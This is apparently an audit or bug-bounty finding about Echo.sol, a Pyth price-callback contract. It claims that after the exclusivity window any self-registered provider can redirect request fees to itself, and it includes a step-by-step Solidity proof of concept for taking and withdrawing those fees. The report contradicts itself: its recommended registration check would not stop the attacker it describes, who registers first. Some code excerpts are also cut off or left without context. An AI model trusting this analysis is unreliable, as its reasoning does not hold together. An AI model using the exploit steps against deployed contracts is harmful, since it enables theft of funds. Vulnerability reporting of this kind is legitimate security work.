### Title
Unvalidated `providerToCredit` Parameter in `executeCallback` Allows Fee Theft from Legitimate Providers - (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

### Summary

`Echo.sol`'s `executeCallback` function accepts a caller-controlled `providerToCredit` address and credits the full request fee to it without validating that the address is a registered provider. After the exclusivity period elapses, any unprivileged actor who has self-registered as a provider can call `executeCallback` with their own address, steal the fees that belong to the legitimate assigned provider, and withdraw them.

### Finding Description

`executeCallback` in `Echo.sol` takes a `providerToCredit` parameter and, after the exclusivity window, applies no restriction on who that address may be:

```solidity
function executeCallback(
    address providerToCredit,
    uint64 sequenceNumber,
    bytes[] calldata updateData,
    bytes32[] calldata priceIds
) external payable override {
    Request storage req = findActiveRequest(sequenceNumber);

    if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
        require(
            providerToCredit == req.provider,
            "Only assigned provider during exclusivity period"
        );
    }
    // ... price-ID prefix check, Pyth parse ...
    _state.providers[providerToCredit].accruedFeesInWei += SafeCast
        .toUint128((req.fee + msg.value) - pythFee);
``` [1](#0-0) 

Once the exclusivity period passes, the only guard is removed. There is no `require(_state.providers[providerToCredit].isRegistered, ...)` check analogous to the one present in `requestPriceUpdatesWithCallback`:

```solidity

    _state.providers[provider].isRegistered,
    "Provider not registered"

### Impact Explanation

An attacker can steal the full fee (`req.fee + msg.value - pythFee`) that was paid by the user and should be credited to the legitimate assigned provider. The legitimate provider receives nothing for the request they were registered to fulfill. Across many requests this constitutes a direct, repeatable theft of provider revenue with no upper bound.

### Likelihood Explanation

The attack is fully permissionless and requires no privileged access:

1. Attacker calls `registerProvider(0, 0, 0)` — zero cost.
2. Attacker calls `setFeeManager(attacker_address)` — sets themselves as their own fee manager.
3. A user submits a request to a legitimate provider, paying fees.
4. Attacker waits for `exclusivityPeriodSeconds` to elapse (a configurable, finite window).
5. Attacker fetches valid Pyth price update data from the public Hermes API.
6. Attacker calls `executeCallback(attacker_address, sequenceNumber, updateData, priceIds)`.
7. Attacker calls `withdrawAsFeeManager(attacker_address, amount)` to drain the credited fees.

Valid `updateData` is freely and publicly available from Hermes, so step 5 has no barrier. The exclusivity period is the only delay, and it is finite by design.

### Recommendation

Add a registration check for `providerToCredit` inside `executeCallback`, mirroring the check already present in `requestPriceUpdatesWithCallback`:

```solidity
require(
    _state.providers[providerToCredit].isRegistered,
    "providerToCredit not registered"
);
```

This ensures only legitimate, registered providers can receive fee credits, regardless of who calls the function after the exclusivity period.

### Proof of Concept

```solidity
// 1. Attacker self-registers as a provider with zero fees
echo.registerProvider(0, 0, 0);

// 2. Attacker sets themselves as their own fee manager
echo.setFeeManager(attacker);

// 3. Victim user requests a price update from legitimateProvider, paying fees
uint64 seq = echo.requestPriceUpdatesWithCallback{value: fee}(
    legitimateProvider, publishTime, priceIds, gasLimit
);

// 4. Wait for exclusivityPeriodSeconds to elapse (e.g., vm.warp(...))

// 5. Attacker fetches valid updateData from Hermes (public API)
// 6. Attacker calls executeCallback crediting themselves
echo.executeCallback(attacker, seq, updateData, priceIds);

// 7. Attacker withdraws the stolen fees
echo.withdrawAsFeeManager(attacker, stolenAmount);
// legitimateProvider.accruedFeesInWei == 0 (received nothing)
// attacker received the full req.fee
```

        address providerToCredit,
        uint64 sequenceNumber,
        bytes[] calldata updateData,
        bytes32[] calldata priceIds
    ) external payable override {
        Request storage req = findActiveRequest(sequenceNumber);

        // Check provider exclusivity using configurable period
        if (
            block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds
        ) {
            require(
                providerToCredit == req.provider,
                "Only assigned provider during exclusivity period"
            );
        }

        // Verify priceIds match
        require(
            priceIds.length == req.priceIdPrefixes.length,
            "Price IDs length mismatch"
        );
        for (uint8 i = 0; i < req.priceIdPrefixes.length; i++) {
            // Extract first 8 bytes of the provided price ID
            bytes32 priceId = priceIds[i];
            bytes8 prefix;
            assembly {
                prefix := priceId
            }

            // Compare with stored prefix
            if (prefix != req.priceIdPrefixes[i]) {
                // Now we can directly use the bytes8 prefix in the error
                revert InvalidPriceIds(priceIds[i], req.priceIdPrefixes[i]);
            }
        }

        // TODO: should this use parsePriceFeedUpdatesUnique? also, do we need to add 1 to maxPublishTime?
        IPyth pyth = IPyth(_state.pyth);
        uint256 pythFee = pyth.getUpdateFee(updateData);
        PythStructs.PriceFeed[] memory priceFeeds = pyth.parsePriceFeedUpdates{
            value: pythFee
        }(

            priceIds,
            SafeCast.toUint64(req.publishTime),
            SafeCast.toUint64(req.publishTime)
        );

    function withdrawAsFeeManager(
        address provider,
        uint128 amount
    ) external override {
        require(
            msg.sender == _state.providers[provider].feeManager,
            "Only fee manager"
        );
        require(
            _state.providers[provider].accruedFeesInWei >= amount,
            "Insufficient balance"
        );

        _state.providers[provider].accruedFeesInWei -= amount;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send fees");

        emit FeesWithdrawn(msg.sender, amount);
    }
